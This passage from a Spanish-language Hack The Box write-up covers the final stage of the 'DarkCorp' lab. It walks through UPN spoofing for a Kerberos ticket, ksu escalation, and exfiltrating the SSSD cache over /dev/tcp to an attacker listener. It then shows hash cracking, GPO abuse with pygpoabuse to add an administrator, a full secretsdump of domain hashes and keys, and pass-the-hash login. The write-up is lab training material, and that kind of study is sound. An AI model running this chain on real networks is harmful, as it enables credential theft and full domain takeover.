![](<img/Pasted image 20260504230001.png>)
En este caso dice haber funcionado, vamos a revisar de nuevo el `UPN`.

```bash
proxychains -q /opt/bloodyAD/bloodyAD.py --domain darkcorp.htb --host dc-01 -u john.w -p 'Pack_Beneath_Solid9!' get object angela.w | grep "userPrincipalName"
```

![](<img/Pasted image 20260504230136.png>)
Perfecto, ya esta configurado, ahora vamos a pedir un `TGT`, en este caso le indicaremos que resuelva por `NT_ENTERPRISE` que básicamente quiere deic rpor el `UPN` en vez de por el `sAMAccountName`.

```bash
proxychains -q getTGT.py -hashes :957246c8137069bca672dc6aa0af7c7a -principalType 'NT_ENTERPRISE' darkcorp.htb/angela.w.adm
```
![](<img/Pasted image 20260504230230.png>)
De nuevo, simplificando, lo que hemos hecho es pedir un ticket con el nombre de `angela.w` pero con el alias `angela.w.adm` y como resuelve por `NT_ENTERPRISE` este lo genera a nombre de `angela.w.adm` por mucho de que sea de `angela.w` por lo que cuando lo usemos para auth contra linux (en el contexto de ksu), este simplemente verificara el "nombre" al cual esta y que sea valido y en este caso como pone `angela.w.adm` este nos deja loguearnos como ese user.

Por lo que vamos a pasarnos el `.ccache` a la máquina pivote donde estaba `ebelford`.

```bash
python3 -m http.server 8082
```

![](<img/Pasted image 20260504230443.png>)

```bash
wget http://10.10.14.141:8082/angela.w.adm.ccache
```

![](<img/Pasted image 20260504230437.png>)
Una vez lo tenemos lo pasamos a `/dev/shm`

```bash
cp angela.w.adm.ccache /dev/shm/
```

![](<img/Pasted image 20260504230516.png>)
Ahora simplemente pedimos cambiar de user con `ksu` usando el ticket `TGT`.

```bash
KRB5CCNAME=angela.w.adm.ccache.1 ksu angela.w.adm
```
![](<img/Pasted image 20260504231004.png>)
verificamos sudo

```bash
sudo -l && sudo -i
```
![](<img/Pasted image 20260504231042.png>)
obviamente podemos usar sudo sin creds porque somos admin, así que nos hacemos `root`. Bueno vamos a verificar `SSSD` para ver si cachea creds. `SSSD` es el servicio que conecta a Linux con el `DC`. Por eso nos interesa revisar su config.

```bash
cat /etc/sssd/sssd.conf
```

![](<img/Pasted image 20260504231202.png>)
En este caso lo hace. vamos a listar el dir `/var/lib/sss/db`.

```bash
ls /var/lib/sss/db
```
![](<img/Pasted image 20260504231233.png>)
Perfecto, ahi tenemos el archivo cache, vamos a pasarlo con los alias de bash sobre los sockets de linux (obviamente nos ponemos en esucha con netcat).

![](<img/Pasted image 20261013135114.png>)

```bash
cat cache_darkcorp.htb.ldb >> /dev/tcp/10.10.14.141/4444
```
![](<img/Pasted image 20260504231556.png>)
```bash
sudo nc -nvlp 4444 > cache_darkcorp.htb.ldb
```
![](<img/Pasted image 20260504231602.png>)
Vamos a buscar con las creds que tenemos sobre que usuario son:

```bash
ldbsearch -H cache_darkcorp.htb.ldb '(cachedPassword=*)'
asq: Unable to register control with rootdse!
# record 1
dn: name=taylor.b.adm@darkcorp.htb,cn=users,cn=darkcorp.htb,cn=sysdb
createTimestamp: 1736373877
fullName: Taylor Barnard ADM
gecos: Taylor Barnard ADM
gidNumber: 1730400513
name: taylor.b.adm@darkcorp.htb
objectCategory: user
uidNumber: 1730414101
objectSIDString: S-1-5-21-3432610366-2163336488-3604236847-14101
uniqueID: 6780d137-c4a5-49c2-9240-47ae051365c6
originalDN: CN=Taylor Barnard ADM,CN=Users,DC=darkcorp,DC=htb
originalMemberOf: CN=gpo_manager,CN=Users,DC=darkcorp,DC=htb
originalMemberOf: CN=linux_admins,CN=Users,DC=darkcorp,DC=htb
originalMemberOf: CN=Remote Management Users,CN=Builtin,DC=darkcorp,DC=htb
originalModifyTimestamp: 20250108215501.0Z
entryUSN: 118872
adAccountExpires: 9223372036854775807
adUserAccountControl: 66048
nameAlias: taylor.b.adm@darkcorp.htb
isPosix: TRUE
lastUpdate: 1736373877
initgrExpireTimestamp: 0
ccacheFile: FILE:/tmp/krb5cc_1730414101_B5njUL
cachedPassword: $6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHv
 lnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.
cachedPasswordType: 1
lastCachedPasswordChange: 1736373912
failedLoginAttempts: 0
lastOnlineAuth: 1736373912
lastOnlineAuthWithCurrentToken: 1736373912
lastLogin: 1736373912
memberof: name=Domain Users@darkcorp.htb,cn=groups,cn=darkcorp.htb,cn=sysdb
memberof: name=linux_admins@darkcorp.htb,cn=groups,cn=darkcorp.htb,cn=sysdb
memberof: name=gpo_manager@darkcorp.htb,cn=groups,cn=darkcorp.htb,cn=sysdb
dataExpireTimestamp: 1
distinguishedName: name=taylor.b.adm@darkcorp.htb,cn=users,cn=darkcorp.htb,cn=
 sysdb
```

Este se llama `taylod.b.adm` (otro admin), por lo que en este caso vamos a romper el hash, para ello copiamos el hash (se repite 2 veces) a un archivo .txt

```bash
cat cache_darkcorp.htb.ldb | strings -n 60 | grep '\$'
```
![](<img/Pasted image 20260504231853.png>)
Lo rompemos con hashcat.

```bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt
```

![](<img/Pasted image 20260504232318.png>)
Perfecto, tenemos. Vamos a probar las creds

```bash
su - taylor.b.adm
```
![](<img/Pasted image 20260504232801.png>)
Funcionan, vamos a ver si somos admin en el DC.

```bash
proxychains -q netexec smb 172.16.20.1 -u taylor.b.adm -p '!QAZzaq1'
```

![](<img/Pasted image 20260504232918.png>)
No lo somos, vamos a ver si nos podemos loguear con winrm en el DC.

```bash
proxychains -q netexec winrm 172.16.20.1 -u taylor.b.adm -p '!QAZzaq1'
```
![](<img/Pasted image 20260504233148.png>)
Perfecto, nos podemos loguearnos con WINRM.

```bash
proxychains -q /home/isma/.local/share/gem/ruby/3.4.0/bin/evil-winrm -i 172.16.20.1 -u taylor.b.adm -p '!QAZzaq1'
```
![](<img/Pasted image 20260504233519.png>)
Vamos a revisar los grupos.

```bash
whoami /groups
```
![](<img/Pasted image 20260504234022.png>)
En este caso, `tyler.b.adm` es parte del grupo GPO_MANAGER, vamos a sobre que directiva de grupo puede módificar desde `bloodhound`.
![](<img/Pasted image 20260504234116.png>)
Perfecto, vamos a usar `gpoabuse` para que (una vez tengamos el identificador sobre la directiva de grupo.) este añada a `tyler.b.adm` como administrador local de el DC.

```bash
proxychains -q python3 pygpoabuse.py 'darkcorp.htb/taylor.b.adm:!QAZzaq1' -gpo-id 652CAE9A-4BB7-49F2-9E52-3361F33CE786 -command 'net localgroup administrators taylor.b.adm /add' -f 
```

![](<img/Pasted image 20260504235329.png>)
dice que lo ha funcionado, vamos a comprobarlo

```bash
proxychains -q netexec smb dc-01 -u taylor.b.adm -p '!QAZzaq1'
```
![](<img/Pasted image 20260504235642.png>)
Perf, vamos a dumpear los secrets (`SAM` y `LSA`)

```bash
(env) ➜  pyGPOAbuse proxychains -q secretsdump.py 'darkcorp.htb/taylor.b.adm:!QAZzaq1@dc-01'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe7c8f385f342172c7b0267fe4f3cbbd6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
darkcorp\DC-01$:aes256-cts-hmac-sha1-96:23f8c53f91fd2035d0dc5163341bd883cc051c1ba998f5aed318cd0d820fa1b2
darkcorp\DC-01$:aes128-cts-hmac-sha1-96:2715a4681263d6f9daf03b7dd7065a23
(env) ➜  pyGPOAbuse sudo proxychains -q secretsdump.py 'darkcorp.htb/taylor.b.adm:!QAZzaq1@dc-01'
[sudo] password for isma: 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xe7c8f385f342172c7b0267fe4f3cbbd6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
darkcorp\DC-01$:aes256-cts-hmac-sha1-96:23f8c53f91fd2035d0dc5163341bd883cc051c1ba998f5aed318cd0d820fa1b2
darkcorp\DC-01$:aes128-cts-hmac-sha1-96:2715a4681263d6f9daf03b7dd7065a23
darkcorp\DC-01$:des-cbc-md5:eca71034201a3826
darkcorp\DC-01$:plain_password_hex:90d17589c9c348f3ea541982f161b1f658cec76e33e32762cba25cf55643a853efd93dd5cffec0cba16e008a2c7112715437d6a33b72e28405c53f68965349b0676128c9cb1997717523971bdaf255f72d9664d3ed5c06f1e5eb3a5b2ef6dc435727ed160e340591724e1230782e2484e25f8484a7b21bf102f71c9a91219cc23743377526a9c73eec8a70def939e673dd244d21be9ec18ba0d915bc080e8bfb3ac8953b5c6e64adb1107b062ddad75ce0e1f805bcdb52de979599787fac9d8246807055b4671191a41804f7918da2b82e3a4fde2959cd227a8af08982a89bcc7437e13426e8ff74273c4e0538a65eeb
darkcorp\DC-01$:aad3b435b51404eeaad3b435b51404ee:45d397447e9d8a8c181655c27ef31d28:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x395bad4405a9fd2285737a8ce7c6d9d60e6fceb3
dpapi_userkey:0x3f426bba655ad645920a84d740836ed1edf35836
[*] NL$KM 
 0000   65 DB D5 E7 F9 08 5C 24  AB 45 B5 E5 5D E5 3F DD   e.....\$.E..].?.
 0010   89 93 2A C7 F3 70 1E 5A  B7 8D 4E D3 BA 3B 5F 0C   ..*..p.Z..N..;_.
 0020   A9 FC 32 69 57 6D E6 78  D0 07 33 43 FE 1E 06 A6   ..2iWm.x..3C....
 0030   1E 56 2C 27 91 47 56 54  91 0D 20 79 E7 7A 2F 95   .V,'.GVT.. y.z/.
NL$KM:65dbd5e7f9085c24ab45b5e55de53fdd89932ac7f3701e5ab78d4ed3ba3b5f0ca9fc3269576de678d0073343fe1e06a61e562c2791475654910d2079e77a2f95
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c032c3e2657f4554bc7af108bd5ef17:::
victor.r:1103:aad3b435b51404eeaad3b435b51404ee:06207752633f7509f8e2e0d82e838699:::
svc_acc:1104:aad3b435b51404eeaad3b435b51404ee:01f55ea10774cce781a1b172478fcd25:::
john.w:1105:aad3b435b51404eeaad3b435b51404ee:b31090fdd33a4044cd815558c4d05b04:::
angela.w:1106:aad3b435b51404eeaad3b435b51404ee:957246c8137069bca672dc6aa0af7c7a:::
angela.w.adm:1107:aad3b435b51404eeaad3b435b51404ee:cf8b05d0462fc44eb783e3f423e2a138:::
taylor.b:1108:aad3b435b51404eeaad3b435b51404ee:ab32e2ad1f05dab03ee4b4d61fcb84ab:::
taylor.b.adm:14101:aad3b435b51404eeaad3b435b51404ee:0577b4b3fb172659dbac0be4554610f8:::
darkcorp.htb\eugene.b:25601:aad3b435b51404eeaad3b435b51404ee:84d9acc39d242f951f136a433328cf83:::
darkcorp.htb\bryce.c:25603:aad3b435b51404eeaad3b435b51404ee:5aa8484c54101e32418a533ad956ca60:::
DC-01$:1000:aad3b435b51404eeaad3b435b51404ee:45d397447e9d8a8c181655c27ef31d28:::
DRIP$:1601:aad3b435b51404eeaad3b435b51404ee:42ef4647a1e14d1143aed111521a535a:::
WEB-01$:20601:aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:97064b5e2ed9569a7a61cb6e71fd624e20de8464fc6d3f7f9c9ccd5ec865cd05
Administrator:aes128-cts-hmac-sha1-96:0424167c3041ed3b8df4ab1c996690c1
Administrator:des-cbc-md5:a1b004ad46dc19d9
krbtgt:aes256-cts-hmac-sha1-96:2795479225a152c8958119e8549079f2a59e101d84a3e464603a9cced55580d6
krbtgt:aes128-cts-hmac-sha1-96:183ebcd77ae33f476eb13c3f4404b98d
krbtgt:des-cbc-md5:7fe9e5ad67524001
victor.r:aes256-cts-hmac-sha1-96:84e79cb6b8959ebdda0dc73d2c6728bb9664d0d75c2aef702b0ea0a4126570bb
victor.r:aes128-cts-hmac-sha1-96:bc1fa04172b62be4428af05dcd4941af
victor.r:des-cbc-md5:62491fa740918316
svc_acc:aes256-cts-hmac-sha1-96:21ebfe2a41e5d614795ef004a06135748d5af03d0f2ca7fd6f6d804ac00f759a
svc_acc:aes128-cts-hmac-sha1-96:aebdba02d03943f17f553495f5f5e1d1
svc_acc:des-cbc-md5:5bec0bb54a405ed9
john.w:aes256-cts-hmac-sha1-96:6c0d89a7461f21150bbab0e4c9dea04ca4feb27a4f432c95030dbfa17f4f7de5
john.w:aes128-cts-hmac-sha1-96:16da7304c10a476b10a0ad301f858826
john.w:des-cbc-md5:e90b041f52b30875
angela.w:aes256-cts-hmac-sha1-96:25f7053fcfb74cf4f02dab4b2c7cb1ae506f3c3c09e4a5b7229b9f21a761830a
angela.w:aes128-cts-hmac-sha1-96:15f1467015c7cdd49ef74fd2fe549cf3
angela.w:des-cbc-md5:5b0168dacbc22a5e
angela.w.adm:aes256-cts-hmac-sha1-96:bec3236552b087f396597c10431e9a604be4b22703d37ae45cde6cd99873c693
angela.w.adm:aes128-cts-hmac-sha1-96:994dccb881c6a80c293cac8730fd18a2
angela.w.adm:des-cbc-md5:cb0268169289bfd9
taylor.b:aes256-cts-hmac-sha1-96:b269239174e6de5c93329130e77143d7a560f26938c06dae8b82cae17afb809c
taylor.b:aes128-cts-hmac-sha1-96:a3f7e9307519e6d3cc8e4fba83df0fef
taylor.b:des-cbc-md5:9b8010a21f1c7a3d
taylor.b.adm:aes256-cts-hmac-sha1-96:4c1e6783666861aac09374bee2bc48ba5ad331f3ac87e067c4a330c6a31dd71a
taylor.b.adm:aes128-cts-hmac-sha1-96:85712fd85df4669be88350520651cfe2
taylor.b.adm:des-cbc-md5:ce6176f4f4e5cd9e
darkcorp.htb\eugene.b:aes256-cts-hmac-sha1-96:33e0cf90ad3c5d0cd264207421c506b56b8ca9703b5be8c58a97169851067fd1
darkcorp.htb\eugene.b:aes128-cts-hmac-sha1-96:adf8b2743349be9684f8ec27df53fa92
darkcorp.htb\eugene.b:des-cbc-md5:2f5ef4b06b231afd
darkcorp.htb\bryce.c:aes256-cts-hmac-sha1-96:e835ec6b7d680472bdf65ac11ec17395930b5d778ba08481ef7290616b1fa7a8
darkcorp.htb\bryce.c:aes128-cts-hmac-sha1-96:09b1a46858723452ce11da2335b602b0
darkcorp.htb\bryce.c:des-cbc-md5:26d55b5849b6e623
DC-01$:aes256-cts-hmac-sha1-96:23f8c53f91fd2035d0dc5163341bd883cc051c1ba998f5aed318cd0d820fa1b2
DC-01$:aes128-cts-hmac-sha1-96:2715a4681263d6f9daf03b7dd7065a23
DC-01$:des-cbc-md5:8038f74f7c0da1b5
DRIP$:aes256-cts-hmac-sha1-96:9e08e8e40f69fc36a5732a6f72d0ab6f40f6fb8e6013daf2f7ee26362129bf28
DRIP$:aes128-cts-hmac-sha1-96:66e3352f59d8af0060d79b8ab1ba89ef
DRIP$:des-cbc-md5:ad072a0db67c7586
WEB-01$:aes256-cts-hmac-sha1-96:f16448747d7df00ead462e40b26561ba01be87d83068ef0ed766ec8e7dd2a12e
WEB-01$:aes128-cts-hmac-sha1-96:7867cb5a59da118ad045a5da54039eae
WEB-01$:des-cbc-md5:38e00bb3d901eaef
[*] Cleaning up... 
```
![](<img/Pasted image 20260505000519.png>)
Perf, vamos a hacer pass the hass como `Administrator` en el `DC-01` y vamos a larpear la flag.

```bash
proxychains -q /home/isma/.local/share/gem/ruby/3.4.0/bin/evil-winrm -i 172.16.20.1 -u administrator -H fcb3ca5a19a1ccf2d14c13e8b64cde0f
```
![](<img/Pasted image 20260505000734.png>)
[Hecho!!](https://labs.hackthebox.com/achievement/machine/3092965/647)

<img src="https://tenor.com/view/druski-dance-jhud-show-the-jennifer-hudson-show-gif-11624980464939939705.gif" height="420" width="420">
![](<img/Pasted image 20260506203110.png>)

